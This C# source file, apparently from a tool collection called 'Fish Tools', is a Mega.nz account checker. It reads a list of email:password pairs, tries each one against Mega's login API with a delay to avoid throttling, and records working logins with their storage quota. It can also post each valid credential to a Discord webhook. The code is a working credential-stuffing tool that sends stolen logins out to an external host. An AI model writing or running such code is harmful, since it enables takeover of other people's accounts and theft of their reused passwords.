﻿/*
------------------------------------------------------------
Made By notfishvr
github: https://github.com/official-notfishvr/Fish-Tools
------------------------------------------------------------
*/
using CG.Web.MegaApiClient;
using Fish_Tools.core.Utils;
using Newtonsoft.Json;
using System.Text;

namespace Fish_Tools.core.MiscTools.AccountChecker.Checkers
{
    internal class MegaAccountChecker
    {
        private static string CombosFile;
        private static readonly string HitsFile = "Result/MegaHits [email pass].txt";
        private static readonly string HitsFile2 = "Result/MegaHits [email pass + Info].txt";
        private static bool UsingDiscord;
        private static string DiscordWebHook;
        private const int CooldownTime = 550;
        public static bool ReTry = false;

        public static void Main(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();

            if (!File.Exists(HitsFile)) { File.Create(HitsFile).Close(); }
            if (!File.Exists(HitsFile2)) { File.Create(HitsFile2).Close(); }

            logger.Info("Please provide the path to your combos file (format: EMAIL:PASSWORD):");
            Console.Write("-> ");
            CombosFile = Console.ReadLine();

            while (string.IsNullOrWhiteSpace(CombosFile) || !File.Exists(CombosFile))
            {
                logger.Error("Invalid path or file does not exist. Please try again:");
                CombosFile = Console.ReadLine();
            }

            logger.Info("If you want hits to be sent to your Discord, insert webhook and press enter. Otherwise, leave blank:");
            Console.Write("-> ");
            string discord = Console.ReadLine();
            UsingDiscord = !string.IsNullOrWhiteSpace(discord);
            DiscordWebHook = discord;

            TestCombos(logger).GetAwaiter().GetResult();
            Console.ReadLine();
        }
        private async static Task CheckLogin(string email, string password, Logger logger)
        {
            var client = new MegaApiClient();
            bool accountChecked = false;
            int retryCount = 0;
            const int maxRetries = 3;

            while (!accountChecked && retryCount < maxRetries)
            {
                try
                {
                    client.Login(email, password);

                    if (client.IsLoggedIn)
                    {
                        var accountInfo = client.GetAccountInformation();
                        string usedSpace = (accountInfo.UsedQuota / 1073741824L).ToString();
                        string totalSpace = (accountInfo.TotalQuota / 1073741824L).ToString();

                        string hitInfo2 = $"{email}:{password} | Used Space: {usedSpace}GB | Total Space: {totalSpace}GB";
                        string hitInfo = $"{email}:{password}";

                        if (UsingDiscord)
                        {
                            using (var httpClient = new HttpClient())
                            {
                                var payload = new
                                {
                                    content = hitInfo2,
                                    embeds = (object)null,
                                    attachments = new object[] { }
                                };

                                var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                                await httpClient.PostAsync(DiscordWebHook, content);
                            }
                        }
                        logger.Success($"[Good] {hitInfo}");
                        File.AppendAllText(HitsFile2, hitInfo2 + Environment.NewLine);
                        File.AppendAllText(HitsFile, hitInfo + Environment.NewLine);
                        accountChecked = true;
                    }
                    else
                    {
                        logger.Error($"[Bad] {email}:{password}");
                        accountChecked = true;
                    }

                    int hitsCount = File.ReadLines(HitsFile).Count();
                    Console.Title = $"Fish Tools | Hits: {hitsCount}";
                }
                catch (Exception ex)
                {
                    if (ex.Message.Contains("ResourceNotExists") && ReTry)
                    {
                        retryCount++;
                        logger.Warn($"[Retry {retryCount}] {email}:{password} | Error: {ex.Message}. Retrying...");
                        await Task.Delay(CooldownTime);
                    }
                    else
                    {
                        logger.Error($"[Bad] {email}:{password} | Error: {ex.Message}");
                        accountChecked = true;
                    }
                }
                finally
                {
                    if (client.IsLoggedIn)
                    {
                        client.Logout();
                    }
                }
            }

            if (retryCount >= maxRetries)
            {
                logger.Error($"[Failed] {email}:{password} | Exceeded max retries.");
            }
        }
        private static async Task TestCombos(Logger logger)
        {
            string[] combos = File.ReadAllLines(CombosFile)
                .Select(line => line.Trim())
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .ToArray();

            if (combos.Length == 0)
            {
                logger.Error("No valid combos detected in the file.");
                return;
            }

            logger.Warn($"Loaded Combos: {combos.Length}");

            if (ConfirmContinue(logger))
            {
                foreach (var combo in combos)
                {
                    var split = combo.Split(':');
                    if (split.Length == 2)
                    {
                        string email = split[0].Trim();
                        string password = split[1].Trim();
                        await CheckLogin(email, password, logger);
                    }

                    await Task.Delay(CooldownTime);
                }
            }
        }
        private static bool ConfirmContinue(Logger logger)
        {
            Console.Clear();
            Console.Title = "Fish Tools";
            logger.PrintArt();
            return true;
        }
    }
}
